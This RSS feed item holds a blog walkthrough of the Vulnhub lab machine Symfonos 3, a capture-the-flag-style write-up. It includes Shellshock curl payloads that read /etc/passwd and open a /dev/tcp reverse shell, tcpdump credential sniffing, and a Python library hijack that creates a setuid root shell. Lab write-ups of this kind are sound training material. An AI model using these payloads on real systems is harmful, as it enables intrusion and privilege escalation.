<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>ShellShock on ikuamike</title><link>https://blog.ikuamike.io/tags/shellshock/</link><description>Recent content in ShellShock on ikuamike</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>Â© Michael Ikua</copyright><lastBuildDate>Thu, 11 Feb 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.ikuamike.io/tags/shellshock/index.xml" rel="self" type="application/rss+xml"/><item><title>Vulnhub: Symfonos 3</title><link>https://blog.ikuamike.io/posts/2021/symfonos3/</link><pubDate>Thu, 11 Feb 2021 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2021/symfonos3/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos1.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Difficulty&lt;/th>
&lt;th>Release Date&lt;/th>
&lt;th>Author&lt;/th>
&lt;th>Machine link&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Intermediate&lt;/td>
&lt;td>7 Apr 2020&lt;/td>
&lt;td>Zayotic&lt;/td>
&lt;td>&lt;a href="https://vulnhub.com/entry/symfonos-31,332">https://vulnhub.com/entry/symfonos-31,332&lt;/a>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h1 id="summary">Summary&lt;/h1>
&lt;p>In this box, we need to perform some directory bruteforce then use shellshock vulnerability to get our first shell.
We then sniff local traffic using tcpdump and get credentials for the next user who has permissions to write python2.7 lib
directory. Using those write permissions we hijack a library that is imported in a script that is executed by root in a
cron job. We create a suid bash binary that we use to get a root shell.&lt;/p>
&lt;h1 id="reconnaissance">Reconnaissance&lt;/h1>
&lt;p>Nmap&lt;/p>
&lt;pre>&lt;code class="language-nmap" data-lang="nmap">Nmap scan report for 192.168.191.130
Host is up (0.00025s latency).
PORT STATE SERVICE VERSION
21/tcp open ftp ProFTPD 1.3.5b
22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
| 2048 cd:64:72:76:80:51:7b:a8:c7:fd:b2:66:fa:b6:98:0c (RSA)
| 256 74:e5:9a:5a:4c:16:90:ca:d8:f7:c7:78:e7:5a:86:81 (ECDSA)
|_ 256 3c:e4:0b:b9:db:bf:01:8a:b7:9c:42:bc:cb:1e:41:6b (ED25519)
80/tcp open http Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code>&lt;/pre>&lt;h1 id="enumeration">Enumeration&lt;/h1>
&lt;h2 id="http-80">HTTP (80)&lt;/h2>
&lt;p>Visiting the IP on the browser, all we get is a picture.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-11.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>Viewing the source doesn&amp;rsquo;t reveal much.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-12.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>Performing a recursive directory bruteforce using ffuf with recursion enabled we get several directories.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ffuf -ic -c -u http://192.168.191.130/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -recursion | tee ffuf.out.recurse
&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-3.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>Going to the research endpoint, there&amp;rsquo;s information about the Underworld and Greek mythology.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-4.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>Some of the words look similar to the directories we discovered, so let&amp;rsquo;s create a wordlist which maybe helpful later.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">cewl http://192.168.191.130/gate/cerberus/tartarus/research -w words.txt
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The current directories we have discovered don&amp;rsquo;t have much in them. At this point I was stuck a bit, after looking at
some writeups I realized that sometimes valid directories show when you have a trailing slash at the end. So I ran ffuf again
with a trailing slash.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">ffuf -ic -c -u http://192.168.191.130/FUZZ/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt | tee ffuf.rootdir
&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-5.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>With this idea, cgi-bin directory is discovered. This is a nice directory bruteforce tip I&amp;rsquo;ll use going forward. The presence of
cgi-bin could potentially mean we can have a shellshock vulnerability.&lt;/p>
&lt;p>Running another bruteforce using the wordlist I created earlier didn&amp;rsquo;t work. I then thought to get a lowercase version of the
words and try it.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">cewl --lowercase http://192.168.191.130/gate/cerberus/tartarus/research -w words2.txt
ffuf -ic -c -u http://192.168.191.130/cgi-bin/FUZZ -w words2.txt
&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-13.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>With the lowercase wordlist, we get underworld.&lt;/p>
&lt;p>To verify the shellshock vulnerability, we can send this request.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">curl -A &lt;span style="color:#e6db74">&amp;#34;() { :; }; echo; echo; /bin/bash -c &amp;#39;cat /etc/passwd&amp;#39;&amp;#34;&lt;/span> http://192.168.191.130/cgi-bin/underworld
&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-6.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;h1 id="shell-as-cerberus">Shell as cerberus&lt;/h1>
&lt;p>After verifying this vulnerability, we can get a reverse shell.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">curl -A &lt;span style="color:#e6db74">&amp;#34;() { :; }; echo; echo; /bin/bash -c &amp;#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.191.1/9000 0&amp;gt;&amp;amp;1 &amp;amp;&amp;#39;&amp;#34;&lt;/span> http://192.168.191.130/cgi-bin/underworld
&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-7.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>On running id we notice that cerberus is part of pcap group. To figure out what is unique about this group I used the find
command.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">find / -group pcap -ls 2&amp;gt;/dev/null
&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-8.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>This reveals we can run tcpdump, therefore we can sniff network traffic.&lt;/p>
&lt;p>Before sniffing traffic, I used &lt;a href="https://github.com/DominicBreuker/pspy" target="_blank" rel="noopener">pspy&lt;/a>
to check for cron jobs and other commands being executed.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-9.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>With this I was able to pick up a cronjob that runs as root. Since ftpclient.py is being executed, I&amp;rsquo;ll sniff ftp
traffic which isn&amp;rsquo;t typically encrypted.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">tcpdump port &lt;span style="color:#ae81ff">21&lt;/span> -n -i lo -A
&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-10.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>From the tcpdump traffic we get new credentials, hades : PTpZTfU4vxgzvRBE.&lt;/p>
&lt;h1 id="privilege-escalation">Privilege Escalation&lt;/h1>
&lt;p>Using the credentials we login to ssh as hades, running id reveals hades is in gods group.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-14.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>Running find again reveals we have write permissions to /usr/lib/python2.7 folder.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">find / -group gods -ls 2&amp;gt;/dev/null
&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-15.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>Based on the earlier output of pspy, we saw a cronjob that was running as root and python2.7 was being executed. Therefore we can hijack
any imports in that ftpclient.py script.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-16.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>Since ftplib is imported, we&amp;rsquo;ll replace ftplib.py with this script&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#f92672">import&lt;/span> os
os&lt;span style="color:#f92672">.&lt;/span>system(&lt;span style="color:#e6db74">&amp;#39;cp /bin/bash /tmp/bash&amp;#39;&lt;/span>)
os&lt;span style="color:#f92672">.&lt;/span>system(&lt;span style="color:#e6db74">&amp;#39;chmod +s /tmp/bash&amp;#39;&lt;/span>)
&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-17.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>This will create a setuid bash binary in /tmp. Which can use to gain root privileges.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-18.png" alt="symfonos" class="center" style="border-radius: 8px;" /></content></item></channel></rss>